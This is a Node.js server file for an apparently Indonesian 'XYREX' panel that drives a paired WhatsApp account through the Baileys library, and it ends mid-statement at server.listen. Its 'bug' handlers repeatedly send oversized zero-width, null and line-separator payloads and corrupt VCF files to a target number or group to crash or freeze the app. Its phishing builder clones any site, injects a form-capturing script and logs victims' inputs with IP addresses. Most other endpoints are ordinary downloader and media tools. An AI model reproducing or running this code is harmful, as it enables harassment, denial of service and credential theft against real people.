const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const QRCode = require('qrcode');
const pino = require('pino');
const fs = require('fs');
const crypto = require('crypto');
const axios = require('axios');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const USERS_FILE = './users.json';
const TOKENS_FILE = './tokens.json';
const CHAT_FILE = './chatlog.json';
const MAX_CHAT = 100;

function hashPw(pw) {
  return crypto.createHash('sha256').update(String(pw)).digest('hex');
}

function loadUsers() {
  if (!fs.existsSync(USERS_FILE)) {
    const def = {
      Dlizz: {
        username: 'Dlizz',
        password: hashPw('20111608'),
        role: 'owner',
        createdAt: Date.now(),
        createdBy: 'system'
      }
    };
    fs.writeFileSync(USERS_FILE, JSON.stringify(def, null, 2));
    return def;
  }
  try { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); }
  catch (e) { return {}; }
}

function saveUsers(users) {
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

function loadTokens() {
  if (!fs.existsSync(TOKENS_FILE)) return {};
  try { return JSON.parse(fs.readFileSync(TOKENS_FILE, 'utf8')); }
  catch (e) { return {}; }
}

function saveTokens(tokens) {
  fs.writeFileSync(TOKENS_FILE, JSON.stringify(tokens, null, 2));
}

function genToken() {
  return crypto.randomBytes(24).toString('hex');
}

function loadChat() {
  if (!fs.existsSync(CHAT_FILE)) return [];
  try { return JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8')); }
  catch (e) { return []; }
}

function saveChat(msgs) {
  try { fs.writeFileSync(CHAT_FILE, JSON.stringify(msgs.slice(-MAX_CHAT), null, 2)); }
  catch (e) { console.log('saveChat err:', e.message); }
}

function authMiddleware(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token) return res.status(401).json({ ok: false, msg: 'No token' });
  const tokens = loadTokens();
  const username = tokens[token];
  if (!username) return res.status(401).json({ ok: false, msg: 'Invalid token' });
  const users = loadUsers();
  if (!users[username]) return res.status(401).json({ ok: false, msg: 'User gone' });
  req.user = users[username];
  req.token = token;
  next();
}



function ownerOnly(req, res, next) {
  if (req.user.role !== 'owner') {
    return res.status(403).json({ ok: false, msg: 'Hanya Owner yang bisa akses' });
  }
  next();
}

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.json({ ok: false, msg: 'Isi username dan password' });
  const users = loadUsers();
  const u = users[username];
  if (!u) return res.json({ ok: false, msg: 'Akun tidak ditemukan' });
  if (u.password !== hashPw(password)) return res.json({ ok: false, msg: 'Password salah' });
  const token = genToken();
  const tokens = loadTokens();
  tokens[token] = username;
  saveTokens(tokens);
  res.json({ ok: true, token, role: u.role, username: u.username });
});

app.post('/api/logout', authMiddleware, (req, res) => {
  const tokens = loadTokens();
  delete tokens[req.token];
  saveTokens(tokens);
  res.json({ ok: true });
});

app.get('/api/me', authMiddleware, (req, res) => {
  res.json({ ok: true, username: req.user.username, role: req.user.role });
});

app.get('/api/users', authMiddleware, ownerOnly, (req, res) => {
  const users = loadUsers();
  const list = Object.values(users).map(u => ({
    username: u.username,
    role: u.role,
    createdAt: u.createdAt,
    createdBy: u.createdBy
  }));
  res.json({ ok: true, users: list });
});

app.post('/api/users', authMiddleware, ownerOnly, (req, res) => {
  const { username, password, role } = req.body || {};
  if (!username || !password || !role) return res.json({ ok: false, msg: 'Lengkapi semua field' });
  if (!['member', 'premium', 'admin'].includes(role)) {
    return res.json({ ok: false, msg: 'Role tidak valid' });
  }
  const users = loadUsers();
  if (users[username]) return res.json({ ok: false, msg: 'Username sudah ada' });
  users[username] = {
    username,
    password: hashPw(password),
    role,
    createdAt: Date.now(),
    createdBy: req.user.username
  };
  saveUsers(users);
  res.json({ ok: true, msg: 'Akun ' + username + ' dibuat dengan role ' + role });
});

app.delete('/api/users/:username', authMiddleware, ownerOnly, (req, res) => {
  const { username } = req.params;
  const users = loadUsers();
  if (!users[username]) return res.json({ ok: false, msg: 'User tidak ada' });
  if (users[username].role === 'owner') {
    return res.json({ ok: false, msg: 'Akun owner tidak bisa dihapus' });
  }
  delete users[username];
  saveUsers(users);
  res.json({ ok: true, msg: 'Akun ' + username + ' dihapus' });
});

app.put('/api/users/:username/role', authMiddleware, ownerOnly, (req, res) => {
  const { username } = req.params;
  const { role } = req.body || {};
  if (!['member', 'premium', 'admin'].includes(role)) {
    return res.json({ ok: false, msg: 'Role tidak valid' });
  }
  const users = loadUsers();
  if (!users[username]) return res.json({ ok: false, msg: 'User tidak ada' });
  if (users[username].role === 'owner') return res.json({ ok: false, msg: 'Owner tidak bisa diubah' });
  users[username].role = role;
  saveUsers(users);
  res.json({ ok: true, msg: 'Role ' + username + ' jadi ' + role });
});

let sock = null;
let isConnected = false;
let currentSender = null;
let reconnecting = false;
let currentMode = null;

function cleanPhone(phone) {
  let n = String(phone).replace(/[^0-9]/g, '');
  if (n.startsWith('0')) n = '62' + n.slice(1);
  if (n.startsWith('620')) n = '62' + n.slice(3);
  return n;
}

function resetAuth() {
  try {
    if (fs.existsSync('./auth')) fs.rmSync('./auth', { recursive: true, force: true });
  } catch (e) { console.log('resetAuth err:', e.message); }
}

async function initSocket(socketId, mode) {
  currentMode = mode;
  const { state, saveCreds } = await useMultiFileAuthState('./auth');
  const { version } = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    auth: state,
    browser: ['XYREX', 'Chrome', '1.0.0'],
    generateHighQualityLinkPreview: true,
    syncFullHistory: false,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    keepAliveIntervalMs: 25000
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr && currentMode === 'qr') {
      try {
        const qrDataURL = await QRCode.toDataURL(qr);
        io.to(socketId).emit('qr', qrDataURL);
      } catch (e) { console.error('QR error:', e); }
    }

    if (connection === 'open') {
      isConnected = true;
      reconnecting = false;
      currentSender = sock.user?.id?.split(':')[0] || 'unknown';
      // Daftarkan ke sender registry
      try {
        const userMatch = loadTokens()[socket.id];
        const ownerName = userMatch || 'unknown';
        const existing = senderRegistry.findIndex(x => x.id === currentSender);
        const entry = {
          id: currentSender,
          owner: ownerName,
          label: 'Sender ' + currentSender.slice(-4),
          socketId: socketId,
          time: Date.now()
        };
        if (existing >= 0) {
          senderRegistry[existing] = entry;
        } else {
          senderRegistry.push(entry);
        }
        io.emit('senderUpdate', getSenderList());
        console.log('[XYREX] Sender terdaftar:', currentSender, 'oleh', ownerName);
      } catch (e) { console.log('reg sender err:', e.message); }
      io.to(socketId).emit('connected', { sender: currentSender });
      console.log('[XYREX] Sender aktif:', currentSender);
    }

    if (connection === 'close') {
      isConnected = false;
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code === DisconnectReason.loggedOut) {
        io.to(socketId).emit('disconnected');
        resetAuth();
      } else if (!reconnecting) {
        reconnecting = true;
        setTimeout(() => {
          reconnecting = false;
          initSocket(socketId, currentMode).catch(e => console.log('restart err:', e.message));
        }, 2000);
      }
    }
  });
}

let senderRegistry = []; // array { id, owner, label, socketId, time }

function getSenderList() {
  return senderRegistry.map(s => ({
    id: s.id,
    owner: s.owner,
    label: s.label,
    socketId: s.socketId,
    time: s.time
  }));
}

let chatHistory = loadChat();

io.on('connection', (socket) => {
  console.log('[IO] Client:', socket.id);

  socket.emit('chatHistory', chatHistory);

  socket.on('chatSend', (data) => {
    const { username, role, message } = data || {};
    if (!username || !message) return;
    const msg = {
      username: String(username).slice(0, 32),
      role: String(role || 'member').slice(0, 16),
      message: String(message).slice(0, 500),
      time: Date.now()
    };
    chatHistory.push(msg);
    if (chatHistory.length > MAX_CHAT) chatHistory = chatHistory.slice(-MAX_CHAT);
    saveChat(chatHistory);
    io.emit('chatMessage', msg);
  });

  socket.on('startQR', async () => {
    try {
      if (sock) {
        try { sock.ws?.close(); } catch (e) {}
        try { sock.end(undefined); } catch (e) {}
        sock = null;
        await new Promise(r => setTimeout(r, 800));
      }
      resetAuth();
      await initSocket(socket.id, 'qr');
    } catch (e) {
      socket.emit('pairingError', { message: e.message });
    }
  });

  socket.on('startPairing', async ({ phone }) => {
    const clean = cleanPhone(phone);
    try {
      if (sock) {
        try { sock.ws?.close(); } catch (e) {}
        try { sock.end(undefined); } catch (e) {}
        sock = null;
        await new Promise(r => setTimeout(r, 800));
      }
      resetAuth();
      await initSocket(socket.id, 'code');
      await new Promise(r => setTimeout(r, 2500));
      const code = await sock.requestPairingCode(clean);
      socket.emit('pairingCode', { code, clean, expireAt: Date.now() + 60000 });
    } catch (e) {
      socket.emit('pairingError', { message: e.message || 'Gagal generate code' });
    }
  });

  socket.on('executeBug', async ({ target, bugType, count }) => {
    if (!isConnected || !sock) {
      socket.emit('bugLog', { msg: 'Sender belum aktif.' });
      return;
    }
    const cleanTarget = cleanPhone(target) + '@s.whatsapp.net';
    const total = count || 50;
    socket.emit('bugLog', { msg: 'Mulai ' + bugType + ' ke ' + target + ' x' + total });
    for (let i = 0; i < total; i++) {
      try {
        let payload;
        if (bugType === 'crash') {
          payload = '\u200B'.repeat(65536) + '\n'.repeat(1000);
          await sock.sendMessage(cleanTarget, { text: payload });
        } else if (bugType === 'delay') {
          payload = '\u200B\u200B\u200B'.repeat(10000);
          await sock.sendMessage(cleanTarget, {
            text: payload,
            contextInfo: { forwardingScore: 999, isForwarded: true }
          });
        } else if (bugType === 'foreclose') {
          payload = '\u0000'.repeat(50000);
          await sock.sendMessage(cleanTarget, {
            text: payload,
            mentions: [cleanTarget]
          });
        }
        socket.emit('bugLog', { msg: '[' + (i + 1) + '/' + total + '] ok' });
      } catch (e) {
        socket.emit('bugLog', { msg: '[' + (i + 1) + '/' + total + '] err: ' + e.message });
      }
      await new Promise(r => setTimeout(r, 200));
    }
    socket.emit('bugLog', { msg: 'Selesai.' });
  });

  socket.on('bugNumber', async ({ target, mode }) => {
    if (!isConnected || !sock) {
      socket.emit('bugError', { code: 'sender_offline', msg: 'Sender WhatsApp belum terhubung. Pairing dulu di menu Pairing Sender.' });
      return;
    }
    const cleanTarget = cleanPhone(target) + '@s.whatsapp.net';

    // Karakter khusus
    const ZW = '\u200B';
    const ZWNJ = '\u200C';
    const ZWJ = '\u200D';
    const LS = '\u2028';
    const PS = '\u2029';
    const RLO = '\u202E';
    const VS = '\uFE0F';
    const NULL = '\u0000';

    // Gabungan teks gacor
    const bigText = (ZW + ZWNJ + ZWJ).repeat(20000) + LS.repeat(500) + PS.repeat(500);
    const medText = (ZW + ZWJ + VS).repeat(12000) + LS.repeat(300);
    const smallText = NULL.repeat(20000) + (ZW + ZWNJ).repeat(10000) + RLO.repeat(80);
    const iosText = LS.repeat(1500) + PS.repeat(1500) + ZWJ.repeat(25000) + VS.repeat(1500) + RLO.repeat(80);

    // Payload file (VCF corrupt) — isinya tetap teks besar
    function makeVcfPayload(content) {
      return 'BEGIN:VCARD\r\nVERSION:3.0\r\nFN:' + content.slice(0, 100) + '\r\nN:;' + content.slice(0, 200) + ';;;\r\nTEL;TYPE=CELL:' + content.slice(0, 500) + '\r\nNOTE:' + content + '\r\nEND:VCARD';
    }

    let total = 30;
    let mode_name = mode;

    if (mode === 'crash') { total = 30; }
    else if (mode === 'delay') { total = 25; }
    else if (mode === 'foreclose') { total = 40; }
    else if (mode === 'crash_ios') { total = 50; }

    socket.emit('bugProgress', { current: 0, total: total });

    let ok = 0;
    let fail = 0;

    for (let i = 0; i < total; i++) {
      try {
        if (mode === 'crash') {
          // 1. Kirim teks besar
          await sock.sendMessage(cleanTarget, { text: bigText });
          // 2. Kirim file VCF corrupt dengan payload besar
          if (i % 3 === 0) {
            const buf = Buffer.from(makeVcfPayload(bigText), 'utf-8');
            await sock.sendMessage(cleanTarget, {
              document: buf,
              mimetype: 'text/vcard',
              fileName: 'contact_' + i + '.vcf',
              caption: ZW.repeat(1000)
            });
          }
        } else if (mode === 'delay') {
          // Teks + forwarded + mention + quoted
          await sock.sendMessage(cleanTarget, {
            text: medText,
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              mentionedJid: [cleanTarget]
            }
          });
          // File dummy kecil
          if (i % 2 === 0) {
            const buf = Buffer.from(medText, 'utf-8');
            await sock.sendMessage(cleanTarget, {
              document: buf,
              mimetype: 'application/octet-stream',
              fileName: 'data_' + i + '.bin',
              caption: ''
            });
          }
        } else if (mode === 'foreclose') {
          // 3 layer: teks + file + metadata
          await sock.sendMessage(cleanTarget, {
            text: smallText,
            mentions: [cleanTarget],
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true
            }
          });
          if (i % 2 === 0) {
            const buf = Buffer.from(smallText, 'utf-8');
            await sock.sendMessage(cleanTarget, {
              document: buf,
              mimetype: 'text/plain',
              fileName: 'note_' + i + '.txt',
              caption: ZW.repeat(2000)
            });
          }
        } else if (mode === 'crash_ios') {
          // Payload khusus iOS + file corrupt
          await sock.sendMessage(cleanTarget, {
            text: iosText,
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              mentionedJid: [cleanTarget],
              expiration: 86400
            }
          });
          if (i % 3 === 0) {
            const buf = Buffer.from(iosText, 'utf-8');
            await sock.sendMessage(cleanTarget, {
              document: buf,
              mimetype: 'text/vcard',
              fileName: 'vcard_' + i + '.vcf',
              caption: LS.repeat(200)
            });
          }
        }
        ok++;
        socket.emit('bugProgress', { current: i + 1, total: total });
      } catch (e) {
        fail++;
        socket.emit('bugProgress', { current: i + 1, total: total });
      }
      // Jeda acak
      await new Promise(r => setTimeout(r, 250 + Math.random() * 200));
    }

    socket.emit('bugDone', { ok: ok, fail: fail });
  });

  socket.on('banGroup', async ({ groupLink, mode }) => {
    if (!isConnected || !sock) {
      socket.emit('bugError', { code: 'sender_offline', msg: 'Sender WhatsApp belum terhubung.' });
      return;
    }

    const ZW = '\u200B';
    const ZWNJ = '\u200C';
    const ZWJ = '\u200D';
    const LS = '\u2028';
    const PS = '\u2029';

    let code = groupLink;
    const m = groupLink.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
    if (m) code = m[1];

    if (mode === 'ban') {
      socket.emit('bugProgress', { current: 0, total: 30 });
      let ok = 0, fail = 0;
      for (let i = 0; i < 30; i++) {
        try {
          const info = await sock.groupGetInviteInfo(code);
          if (info && info.id) {
            await sock.groupLeave(info.id);
            ok++;
          }
        } catch (e) { fail++; }
        socket.emit('bugProgress', { current: i + 1, total: 30 });
        await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
      }
      socket.emit('bugDone', { ok: ok, fail: fail });
    } else if (mode === 'crash') {
      try {
        const info = await sock.groupGetInviteInfo(code);
        if (info && info.id) {
          const payload = (ZW + ZWNJ + ZWJ).repeat(27000) + LS.repeat(500) + PS.repeat(500);
          socket.emit('bugProgress', { current: 0, total: 8 });

          for (let i = 0; i < 8; i++) {
            try {
              // Kirim teks besar
              await sock.sendMessage(info.id, {
                text: payload,
                contextInfo: { forwardingScore: 999, isForwarded: true }
              });
              // Kirim file corrupt tiap 2 iterasi
              if (i % 2 === 0) {
                const buf = Buffer.from(payload, 'utf-8');
                await sock.sendMessage(info.id, {
                  document: buf,
                  mimetype: 'text/vcard',
                  fileName: 'crash_' + i + '.vcf',
                  caption: ZW.repeat(1000)
                });
              }
              socket.emit('bugProgress', { current: i + 1, total: 8 });
            } catch (e) {
              socket.emit('bugProgress', { current: i + 1, total: 8 });
            }
            await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
          }
          socket.emit('bugDone', { ok: 1, fail: 0 });
        } else {
          socket.emit('bugError', { code: 'no_group', msg: 'Grup tidak ditemukan atau sender belum join.' });
        }
      } catch (e) {
        socket.emit('bugError', { code: 'group_err', msg: 'Gagal akses grup: ' + e.message });
      }
    }
  });

  socket.on('sender:list', () => {
    const tokens = loadTokens();
    const myUser = tokens[socket.id] || null;
    const list = getSenderList();
    const pribadi = myUser ? list.filter(s => s.owner === myUser) : [];
    const global = list.filter(s => s.owner !== myUser);
    socket.emit('sender:data', { pribadi, global, me: myUser });
  });

  socket.on('resetSession', () => {
    try { sock?.end(undefined); } catch (e) {}
    sock = null;
    resetAuth();
    socket.emit('pairingError', { message: 'Sesi direset. Coba lagi.' });
  });
});


// ===== TOOLS ENDPOINTS =====
app.get('/api/tools/video', authMiddleware, async (req, res) => {
  try {
    const url = req.query.url;
    if (!url) return res.json({ ok: false, msg: 'URL kosong' });

    let platform = 'unknown';
    if (url.includes('tiktok')) platform = 'TikTok';
    else if (url.includes('instagram')) platform = 'Instagram';
    else if (url.includes('youtube') || url.includes('youtu.be')) platform = 'YouTube';
    else if (url.includes('facebook') || url.includes('fb.watch')) platform = 'Facebook';

    let videoUrl = '';
    let title = '';

    // TikTok - pakai tikwm
    if (platform === 'TikTok') {
      try {
        const r = await axios.post('https://www.tikwm.com/api/', { url: url, hd: 1 }, { timeout: 20000 });
        if (r.data && r.data.data) {
          const d = r.data.data;
          // Prioritas: HD, lalu play tanpa watermark
          videoUrl = d.hdplay || d.play || d.wmplay || '';
          title = d.title || 'TikTok Video';
        }
      } catch (e) {
        console.log('tikwm err:', e.message);
      }
    }

    // YouTube
    if (!videoUrl && platform === 'YouTube') {
      try {
        const r = await axios.get('https://api.akuari.my.id/downloader/yt?link=' + encodeURIComponent(url), { timeout: 20000 });
        const d = r.data && r.data.result;
        if (d) {
          videoUrl = d.video || d.video_hd || (d.link && d.link.video) || '';
          title = d.title || 'YouTube Video';
        }
      } catch (e) {}
    }

    // Instagram
    if (!videoUrl && platform === 'Instagram') {
      try {
        const r = await axios.get('https://api.akuari.my.id/downloader/ig?link=' + encodeURIComponent(url), { timeout: 20000 });
        const d = r.data && r.data.result;
        if (d) {
          videoUrl = (d.url && d.url[0]) || d.video || '';
          title = d.title || 'Instagram Video';
        }
      } catch (e) {}
    }

    // Facebook
    if (!videoUrl && platform === 'Facebook') {
      try {
        const r = await axios.get('https://api.akuari.my.id/downloader/fb?link=' + encodeURIComponent(url), { timeout: 20000 });
        const d = r.data && r.data.result;
        if (d) {
          videoUrl = d.video_hd || d.video_sd || (d.url && d.url[0]) || '';
          title = d.title || 'Facebook Video';
        }
      } catch (e) {}
    }

    // Fallback umum
    if (!videoUrl) {
      return res.json({ ok: false, msg: 'Gagal ambil URL video dari platform ini' });
    }

    res.json({ ok: true, url: videoUrl, title: title, platform: platform });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});

app.post('/api/tools/gmail/create', authMiddleware, async (req, res) => {
  try {
    const r = await axios.get('https://api.mail.tm/domains', { timeout: 15000 });
    const domains = r.data['hydra:member'];
    if (!domains || !domains.length) return res.json({ ok: false, msg: 'Tidak ada domain tersedia' });
    const domain = domains[0].domain;
    const username = 'xyrex' + Math.random().toString(36).substring(2, 10);
    const password = Math.random().toString(36).substring(2, 14);
    const email = username + '@' + domain;
    const r2 = await axios.post('https://api.mail.tm/accounts', { address: email, password }, { timeout: 15000 });
    const r3 = await axios.post('https://api.mail.tm/token', { address: email, password }, { timeout: 15000 });
    res.json({ ok: true, email: email, password: password, token: r3.data.token });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});

app.get('/api/tools/gmail/inbox', authMiddleware, async (req, res) => {
  try {
    const t = req.query.token;
    if (!t) return res.json({ ok: false, msg: 'Token kosong' });
    const r = await axios.get('https://api.mail.tm/messages', {
      headers: { Authorization: 'Bearer ' + t },
      timeout: 15000
    });
    const list = r.data['hydra:member'] || [];
    const messages = list.map(m => ({
      from: m.from && m.from.address,
      subject: m.subject,
      intro: m.intro
    }));
    res.json({ ok: true, messages: messages });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});

app.get('/api/tools/anime/search', authMiddleware, async (req, res) => {
  try {
    const q = req.query.q;
    if (!q) return res.json({ ok: false, msg: 'Query kosong' });



    // Pakai AniList GraphQL API
    const query = `
      query ($search: String) {
        Page(perPage: 20) {
          media(search: $search, type: ANIME) {
            title { romaji }
            coverImage { medium }
            siteUrl
          }
        }
      }
    `;
    const r = await axios.post('https://graphql.anilist.co', {
      query: query,
      variables: { search: q }
    }, { timeout: 15000 });
    const media = r.data.data.Page.media || [];
    const results = media.map(m => ({
      title: m.title.romaji,
      image: m.coverImage.medium,
      url: m.siteUrl
    }));
    res.json({ ok: true, results: results });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});





app.get('/api/tools/music/download', authMiddleware, async (req, res) => {
  try {
    const url = req.query.url;
    if (!url) return res.json({ ok: false, msg: 'URL kosong' });
    res.json({ ok: true, url: url });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});


// ===== MUSIC (Deezer) =====
app.get('/api/tools/music/search', authMiddleware, async (req, res) => {
  try {
    const q = req.query.q;
    if (!q) return res.json({ ok: false, msg: 'Query kosong' });

    // Cari di Deezer dengan strict order
    const r = await axios.get('https://api.deezer.com/search', {
      params: {
        q: q,
        limit: 30,
        order: 'RANKING'  // urut by relevansi
      },
      timeout: 15000
    });
    let data = r.data.data || [];

    // Filter: hanya hasil yang judulnya mengandung kata kunci ATAU artist mengandung kata kunci
    const qLower = q.toLowerCase().trim();
    const qWords = qLower.split(/\s+/).filter(w => w.length > 1);

    data = data.filter(s => {
      const title = (s.title_short || s.title || '').toLowerCase();
      const artist = (s.artist && s.artist.name || '').toLowerCase();
      const album = (s.album && s.album.title || '').toLowerCase();
      const combined = title + ' ' + artist + ' ' + album;
      // Semua kata kunci harus ada di salah satu field
      return qWords.every(w => combined.includes(w));
    });

    // Kalau filter terlalu ketat dan hasil kosong, coba tanpa filter
    if (data.length === 0) {
      data = r.data.data || [];
    }

    // Sort: prioritaskan yang judulnya persis mengandung query
    data.sort((a, b) => {
      const aTitle = (a.title_short || a.title || '').toLowerCase();
      const bTitle = (b.title_short || b.title || '').toLowerCase();
      const aScore = (aTitle.includes(qLower) ? 100 : 0) + (a.rank || 0);
      const bScore = (bTitle.includes(qLower) ? 100 : 0) + (b.rank || 0);
      return bScore - aScore;
    });

    const results = data.slice(0, 20).map(s => ({
      title: s.title_short || s.title,
      artist: s.artist && s.artist.name || '-',
      album: s.album && s.album.title || '-',
      duration: s.duration ? Math.floor(s.duration / 60) + ':' + String(s.duration % 60).padStart(2, '0') : '-',
      artwork: s.album && s.album.cover_medium || s.artist && s.artist.picture_medium || '',
      url: s.preview || '',
      full: false,
      deezerUrl: s.link || ''
    })).filter(s => s.url);

    res.json({ ok: true, results: results, source: 'deezer' });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});

app.get('/api/tools/music/trending', authMiddleware, async (req, res) => {
  try {
    // Deezer chart Indonesia
    const r = await axios.get('https://api.deezer.com/playlist/1313621735', { timeout: 15000 });
    let tracks = r.data && r.data.tracks && r.data.tracks.data || [];
    if (tracks.length === 0) {
      // Fallback: chart global
      const r2 = await axios.get('https://api.deezer.com/chart/0/tracks', { params: { limit: 15 }, timeout: 15000 });
      tracks = r2.data.data || [];
    }
    const results = tracks.slice(0, 15).map(s => ({
      title: s.title_short || s.title,
      artist: s.artist && s.artist.name || '-',
      album: s.album && s.album.title || '-',
      duration: s.duration ? Math.floor(s.duration / 60) + ':' + String(s.duration % 60).padStart(2, '0') : '-',
      artwork: s.album && s.album.cover_medium || s.artist && s.artist.picture_medium || '',
      url: s.preview || '',
      full: false,
      deezerUrl: s.link || ''
    })).filter(s => s.url);
    res.json({ ok: true, results: results });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});


// ===== ANIME TRENDING =====
app.get('/api/tools/anime/trending', authMiddleware, async (req, res) => {
  try {
    const query = {
      query: `query {
        Page(page: 1, perPage: 20) {
          media(sort: TRENDING_DESC, type: ANIME) {
            id
            title { romaji english }
            coverImage { large medium }
            siteUrl
            averageScore
            episodes
          }
        }
      }`
    };
    const r = await axios.post('https://graphql.anilist.co', query, {
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      timeout: 15000
    });
    const media = (r.data && r.data.data && r.data.data.Page && r.data.data.Page.media) || [];
    const results = media.map(m => ({
      title: (m.title && (m.title.romaji || m.title.english)) || '-',
      image: (m.coverImage && (m.coverImage.large || m.coverImage.medium)) || '',
      url: m.siteUrl || '',
      score: m.averageScore || 0,
      episodes: m.episodes || '?'
    }));
    if (results.length === 0) return res.json({ ok: false, msg: 'Tidak ada data trending' });
    res.json({ ok: true, results: results });
  } catch (e) {
    console.log('[ANIME TRENDING ERR]', e.message);
    // Fallback: coba Jikan API (MyAnimeList unofficial)
    try {
      const r2 = await axios.get('https://api.jikan.moe/v4/top/anime', {
        params: { limit: 20, filter: 'airing' },
        timeout: 15000
      });
      const data = (r2.data && r2.data.data) || [];
      const results = data.map(m => ({
        title: m.title,
        image: m.images && m.images.jpg && (m.images.jpg.large_image_url || m.images.jpg.image_url) || '',
        url: m.url,
        score: m.score,
        episodes: m.episodes
      }));
      res.json({ ok: true, results: results, source: 'jikan' });
    } catch (e2) {
      res.json({ ok: false, msg: 'Semua API trending gagal' });
    }
  }
});


// ===== PHISHING BUILDER =====
const PHISH_DIR = path.join(__dirname, 'public', 'phish');
const PHISH_DATA_FILE = path.join(__dirname, 'phish-data.json');

if (!fs.existsSync(PHISH_DIR)) fs.mkdirSync(PHISH_DIR, { recursive: true });

function loadPhishData() {
  if (!fs.existsSync(PHISH_DATA_FILE)) return [];
  try { return JSON.parse(fs.readFileSync(PHISH_DATA_FILE, 'utf8')); }
  catch (e) { return []; }
}
function savePhishData(data) {
  fs.writeFileSync(PHISH_DATA_FILE, JSON.stringify(data.slice(-500), null, 2));
}

function slugifyUrl(url) {
  try {
    const u = new URL(url);
    return u.hostname.replace(/[^a-z0-9]/gi, '_') + '_' + Date.now().toString(36);
  } catch (e) {
    return 'phish_' + Date.now().toString(36);
  }
}

app.post('/api/phishing/create', authMiddleware, async (req, res) => {
  try {
    const { url } = req.body || {};
    if (!url) return res.json({ ok: false, msg: 'URL kosong' });
    if (!url.startsWith('http')) return res.json({ ok: false, msg: 'URL harus http/https' });

    const r = await axios.get(url, {
      timeout: 20000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5'
      },
      maxRedirects: 5
    });

    let html = r.data;
    if (typeof html !== 'string') html = JSON.stringify(html);

    const slug = slugifyUrl(url);
    const targetDir = path.join(PHISH_DIR, slug);
    fs.mkdirSync(targetDir, { recursive: true });

    try {
      const parsed = new URL(url);
      const origin = parsed.origin;
      html = html.replace(/(src|href|action|data-src)="(\/[^"]*)"/g, function(m, attr, pathv) {
        return attr + '="' + origin + pathv + '"';
      });
      if (html.indexOf('<base') === -1) {
        html = html.replace(/<head([^>]*)>/i, '<head$1><base href="' + origin + '/">');
      }
    } catch (e) {}

    const captureScript = '<script src="/phish/' + slug + '/phish-capture.js"></script>';
    if (html.indexOf('</body>') !== -1) {
      html = html.replace('</body>', captureScript + '</body>');
    } else {
      html += captureScript;
    }

    fs.writeFileSync(path.join(targetDir, 'index.html'), html);

    const captureJS = `(function(){
  function getSlug() { return '` + slug + `'; }
  document.addEventListener('DOMContentLoaded', function() {
    var forms = document.querySelectorAll('form');
    forms.forEach(function(form) {
      form.addEventListener('submit', function(e) {
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(inp) {
          if (inp.name) data[inp.name] = inp.value;
          else if (inp.type === 'email' || inp.type === 'text' || inp.id) data[inp.id || inp.type] = inp.value;
        });
        try {
          fetch('/api/phishing/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              slug: getSlug(),
              url: window.location.href,
              data: data,
              ua: navigator.userAgent,
              time: new Date().toISOString()
            })
          }).catch(function(){});
        } catch (err) {}
      });
    });
  });
})();`;
    fs.writeFileSync(path.join(targetDir, 'phish-capture.js'), captureJS);

    res.json({ ok: true, slug: slug, url: '/phish/' + slug + '/index.html', target: url, msg: 'Phishing page berhasil dibuat' });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});

app.post('/api/phishing/capture', (req, res) => {
  try {
    const body = req.body || {};
    if (!body.slug || !body.data) return res.json({ ok: false });
    const records = loadPhishData();
    records.push({
      slug: body.slug,
      url: body.url || '',
      data: body.data,
      ua: body.ua || '',
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '',
      time: body.time || new Date().toISOString()
    });
    savePhishData(records);
    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});

app.get('/api/phishing/list', authMiddleware, (req, res) => {
  try {
    const items = [];
    if (fs.existsSync(PHISH_DIR)) {
      fs.readdirSync(PHISH_DIR).forEach(function(dir) {
        const fullPath = path.join(PHISH_DIR, dir);
        if (fs.statSync(fullPath).isDirectory()) {
          items.push({ slug: dir, url: '/phish/' + dir + '/index.html' });
        }
      });
    }
    res.json({ ok: true, items: items });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});

app.get('/api/phishing/data', authMiddleware, (req, res) => {
  try {
    const data = loadPhishData();
    res.json({ ok: true, data: data.reverse() });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});

app.delete('/api/phishing/data', authMiddleware, (req, res) => {
  try {
    savePhishData([]);
    res.json({ ok: true, msg: 'Data dihapus' });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});

server.listen(3000, () => {
